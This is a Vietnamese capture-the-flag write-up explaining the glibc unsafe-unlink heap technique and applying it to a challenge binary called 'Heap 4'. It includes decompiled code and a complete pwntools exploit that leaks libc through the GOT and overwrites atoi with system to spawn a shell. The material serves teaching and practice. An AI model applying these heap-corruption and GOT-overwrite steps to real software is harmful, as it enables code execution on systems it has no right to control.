# unsafe unlink (UL)
## Lý thuyết
- UL là kĩ thuật khai thác hàm unlink trong file libc. Lỗi này xảy khi free một chunk, hàm unlink trong libc sẽ kiểm tra `(P->fd->bk != P || P->bk->fd != P) == False`.
<details><summary>Source unlink</summary>

```c
static void
unlink_chunk (mstate av, mchunkptr p)
{<!-- -->
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");

  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;

  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");

  fd->bk = bk;
  bk->fd = fd;
// ....code
// ....code
}
```

</details>

- Kĩ thuật này có thể sử dụng khi ta có lỗi ow heap hoặc có một con trỏ tuỳ chỉnh.
## Unsafe unlink flow
- Tạo 2 chunk A, B, tạo một fake chunk trong A
![image](https://hackmd.io/_uploads/HJIrEjeP3.png)

# Heap 4
## Source code

<details><summary>create heap</summary>

```c
__int64 createHeap()
{
  signed int Int; // [rsp+8h] [rbp-8h]
  unsigned int nmemb; // [rsp+Ch] [rbp-4h]

  printf("Index:");
  Int = readInt();
  if ( (unsigned int)Int >= 0xA )
    exit(0);
  if ( *(&store + Int) )
    return 0LL;
  printf("Input size:");
  nmemb = readInt();
  if ( nmemb > 0x1000 )
    exit(0);
  *(&store + Int) = calloc(nmemb, 1uLL);
  storeSize[Int] = nmemb;
  printf("Input data:");
  readStr(*(&store + Int), nmemb);
  puts("Done");
  return 0LL;
}
```
</details>

<details><summary>showHeap</summary>

```c
__int64 showHeap()
{
  int Int; // [rsp+Ch] [rbp-4h]

  printf("Index:");
  Int = readInt();
  if ( (unsigned int)Int >= 0xA )
    exit(0);
  if ( *(&store + Int) )
    printf("Data = %s\n", (const char *)*(&store + Int));
  return 0LL;
}
```
    
</details>

<details><summary>deleteHeap</summary>

```c
__int64 deleteHeap()
{
  int Int; // [rsp+Ch] [rbp-4h]

  printf("Input index:");
  Int = readInt();
  if ( (unsigned int)Int >= 0xA )
    exit(0);
  if ( *(&store + Int) )
  {
    free(*(&store + Int));
    *(&store + Int) = 0LL;
    puts("Done ");
  }
  return 0LL;
}
```
    
</details>

<details><summary>editHeap</summary>

```c
__int64 editHeap()
{
  int Int; // [rsp+8h] [rbp-28h]
  unsigned int v2; // [rsp+Ch] [rbp-24h]
  char s1[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Input index:");
  Int = readInt();
  if ( (unsigned int)Int >= 0xA )
    exit(0);
  if ( !*(&store + Int) )
    return 0LL;
  printf("Input newsize:");
  v2 = readInt();
  if ( storeSize[Int] < v2 )
    storeSize[Int] = v2;
  puts("Do you want to change data (y/n)?");
  readStr(s1, 10LL);
  if ( !strcmp(s1, "y") )
  {
    printf("Input data:");
    readStr(*(&store + Int), (unsigned int)storeSize[Int]);
  }
  puts("Done ");
  return 0LL;
}
```
                          
</details>

<details><summary>main</summary>
```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  initState(argc, argv, envp);
  puts("Ez heap challange !");
  while ( 1 )
  {
    menu();
    switch ( (unsigned int)readInt() )
    {
      case 1u:
        createHeap();
        break;
      case 2u:
        showHeap();
        break;
      case 3u:
        editHeap();
        break;
      case 4u:
        deleteHeap();
        break;
      case 5u:
        exit(0);
      default:
        puts("no option");
        break;
    }
  }
}
```

</details>

## Khai thác

### Tạo fake chunk
- Đầu tiên, ta cần tạo khoảng 5 đến 6 chunk

```python=
create(str(0), str(0x80), "a"*0x80)    # bỏ vì nó nằm đầu
create(str(1), str(0x80), "a"*0x80)
create(str(2), str(0x80), "a"*0x80)    # 1, 2 có thể bỏ
create(str(3), str(0x80), "a"*0x80)    # target
create(str(4), str(0x80), "a"*0x80)
create(str(5), str(0x80), "a"*0x80)    # bỏ vì nếu unlink nó gộp với top chunk
```
- Vì chương trình không cho ta UAF, ta có thể dùng unsafe unlink để ow store, khi đó ta có thể leak
```python=
wr_section = 0x6020e0 
payload = flat(
    0, 0,                           # size
    wr_section, wr_section + 8      # fd, bk fakechunk
)
payload = payload.ljust(0x80)       # padding
payload += p64(0x80) + p64(0x90)    # ow header chunk 4
edit(str(3), str(144), payload)
delete(str(4))
```
### Leak libc
- Ta sẽ ghi đè store[0] của là địa chỉ của put@got, để khi dùng show, nó sẽ hiện put@plt để ta tính libc base
```python=
edit(str(3), str(144), p64(0x602020))
show("0")
p.recvuntil(b" = ")
libc.address = u64(p.recvline(keepends = False) + b'\0\0') - libc.sym['puts']
info("libc base: " + hex(libc.address))
```
### ow atoi = system
- Vì atoi(nptr) chỉ chứa một tham số, ta có thể ow atoi = system và truyền từ bàn phím nptr = /bin/sh
```python=
edit(str(3), str(144), p64(exe.got['atoi']))
edit(str(0), str(144), p64(libc.sym['system']))
create("/bin/sh", str(0x80), "a"*0x80)
```
    
## Kết quả
![](https://hackmd.io/_uploads/SyBNJ3gDh.png)
```python=
#!/usr/bin/python3

from pwn import *

exe = ELF('pwn4_ul_patched', checksec=False)
libc = ELF('libc.2.23.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
				b* editHeap+0

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()

def create(idx, size, data):
	sla(b">\n", b"1")
	sla(b":",idx.encode())
	sla(b":",size.encode())
	sa(b":",data.encode())

def show(idx):
	sla(b">\n", b"2")
	sla(b":",idx.encode())
def edit(idx, newsize, data):
	sla(b">\n", b"3")
	sla(b":",idx.encode())
	sla(b":",newsize.encode())
	sla(b"?\n",b"y")
	sa(b":", data)
def delete(idx):
	sla(b">\n", b"4")
	sla(b":",idx.encode())
create(str(0), str(0x80), "a"*0x80)
create(str(1), str(0x80), "a"*0x80)
create(str(2), str(0x80), "a"*0x80)
create(str(3), str(0x80), "a"*0x80)
create(str(4), str(0x80), "a"*0x80)
create(str(5), str(0x80), "a"*0x80)
wr_section = 0x6020e0 
payload = flat(
    0, 0,
    wr_section, wr_section + 8
)
payload = payload.ljust(0x80)
payload += p64(0x80) + p64(0x90)
edit(str(3), str(144), payload)
delete(str(4))
edit(str(3), str(144), p64(0x602020))
show("0")
p.recvuntil(b" = ")
libc.address = u64(p.recvline(keepends = False) + b'\0\0') - libc.sym['puts']
info("libc base: " + hex(libc.address))

edit(str(3), str(144), p64(exe.got['atoi']))
edit(str(0), str(144), p64(libc.sym['system']))
create("/bin/sh", str(0x80), "a"*0x80)

p.interactive()

```
